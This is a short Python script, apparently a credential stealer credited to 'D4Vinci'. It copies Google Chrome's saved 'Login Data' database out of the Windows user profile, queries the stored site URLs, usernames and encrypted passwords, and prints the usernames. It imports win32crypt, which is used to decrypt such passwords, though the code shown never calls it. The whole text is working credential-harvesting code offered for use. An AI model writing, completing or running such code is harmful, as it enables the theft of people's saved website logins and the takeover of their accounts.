#Author:D4Vinci
import os,sqlite3,win32crypt,shutil

data=os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
shutil.copy2(data, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running

connection = sqlite3.connect("Loginvault.db")

print("[>]Connected to data base..")
cursor = connection.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for x in cursor.fetchall():
    print(x[1])